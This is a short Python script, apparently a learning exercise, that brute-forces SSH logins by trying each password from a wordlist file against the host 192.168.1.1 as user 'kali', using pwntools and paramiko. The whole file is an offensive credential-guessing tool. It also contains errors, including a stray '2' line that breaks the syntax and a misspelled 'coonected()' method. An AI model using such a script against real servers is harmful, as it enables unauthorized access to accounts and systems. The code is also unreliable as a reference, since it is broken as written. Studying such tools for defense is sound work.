from pwn import *
import paramiko
2
host = "192.168.1.1"
username = "kali"
attempts = 0

with open("small.txt","r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}' !".format(attempts, password))
            response = ssh(host=host , user=username ,password=password,timeout=1)
            if response.coonected():
                print("[>] valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password")
            attempts += 1
